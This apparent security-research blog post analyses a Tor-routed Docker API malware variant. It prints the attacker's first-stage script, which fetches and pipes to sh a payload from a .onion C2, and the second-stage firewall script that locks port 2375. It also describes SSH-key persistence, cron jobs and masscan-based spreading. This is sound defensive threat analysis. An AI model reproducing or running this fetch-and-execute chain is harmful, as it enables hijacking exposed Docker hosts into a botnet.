---
title: "Docker API Malware Variant with Botnet Capabilities"
date: 2025-09-11
draft: false
tags: ["docker", "malware", "tor", "api", "threat-hunting"]
---

### Initial Exploitation

The attackers start by sending an initial HTTP request to a Docker remote API server to create a new container. In this case, the Akamai Threat Hunting team used the Beelzebub honeypot to discover this threat. The attacker then creates a new container image running Alpine Linux that mounts the host's filesystem and executes a base64-encoded script.

### Script executed

```bash
apk update && apk add curl tor && tor & \
while ! curl -fs --proxy socks5h://localhost:9050 https://checkip.amazonaws.com; do sleep 10; done; \
curl -fs --proxy socks5h://localhost:9050 http://wtxqf54djhp5pskv2lfyduub5ievxbyvlzjgjopk6hxge5umombr63ad[.]onion/static/docker-init.sh | sh
```

The script installs "curl" and "tor", then starts a Tor daemon "tor&amp;", and attempts to obtain the public IP address of the victim by looping through every 10 seconds until the IP is requested through the Tor proxy (curl -fs --proxy&nbsp;socks5h://localhost:9050 https://checkip.amazonaws.com; do sleep 10; done;). The attacker is using a SOCKS5 proxy locally to send data to the Tor daemon, which then gets sent to the Tor network and then to the ".onion" C2. The attacker uses this C2 to pull their next-stage script (docker-init.sh) and execute it (curl -fs --proxy socks5h://localhost:9050 http://wtxqf54djhp5pskv2lfyduub5ievxbyvlzjgjopk6hxge5umombr63ad[.]onion/static/docker-init.sh).

Second Stage: docker-init.sh

This script attempts to block access to the Docker API port (2375) using whichever firewall utility it finds:
```sh
PORT=2375
PROTOCOL=tcp

for fw in firewall-cmd ufw pfctl iptables nft; do
  if command -v "$fw" >/dev/null 2>&1; then
    case "$fw" in
      firewall-cmd)
        firewall-cmd --permanent --zone=public \
          --add-rich-rule="rule family='ipv4' port port='${PORT}' protocol='${PROTOCOL}' reject"
        firewall-cmd --reload
        ;;
      ufw)
        ufw deny "${PORT}/${PROTOCOL}"
        ufw reload
        ;;
      pfctl)
        echo "block drop proto ${PROTOCOL} from any to any port ${PORT}" | pfctl -a custom_block -f -
        ;;
      iptables)
        iptables -I INPUT 1 -p "${PROTOCOL}" --dport "${PORT}" -j DROP
        ;;
      nft)
        if ! nft list tables | grep -q "inet"; then
          nft add table inet
          nft add chain inet filter { type filter hook input priority 0 \; }
        fi
        nft add rule inet filter input "${PROTOCOL}" dport "${PORT}" drop
        ;;
    esac
    break
  fi
done
```

The docker-init.sh script first adds the attacker's public key under the SSH authorized public keys (/root/.ssh/authorized_keys) and installs tools for propagation, persistence, and evasion, like masscan (internet-scale port scanner), libpcap (capture network data), libpcap-dev, zstd (decompress payloads), and torsocks (reroute IP traffic from CLI to Tor). The script also creates a cron job that executes every minute and iterates over multiple firewall utilities to block access to port 2375 (used by Docker API).

The attacker then sends an HTTP POST request back to the .onion C2 server to let the attacker know that the compromise was successful. Once this communication is established, the attackers download a binary from another Tor site onto the victim. This binary includes a dropper that contains the content it wants to drop, preventing it from communicating with the internet. The dropper drops a file (dockerd) that executes a masscan that searches for other open Docker API open ports (2375), and if it finds one, it will go through the same container creation process. The attacker's primary goal, which was not seen by earlier variants of the malware, is an initial version of a complex botnet, but the researchers have not found a complete version of it so far.


## References

- [BleepingComputer — Hackers hide behind Tor in exposed Docker API breaches](https://www.bleepingcomputer.com/news/security/hackers-hide-behind-tor-in-exposed-docker-api-breaches/)  
- [Akamai — Off Your Docker: Exposed APIs Are Targeted in New Malware Strain](https://www.akamai.com/blog/security-research/new-malware-targeting-docker-apis-akamai-hunt)  
- [Trend Micro — Tor-enabled Docker exploit](https://www.trendmicro.com/en_fi/research/25/f/tor-enabled-docker-exploit.html)  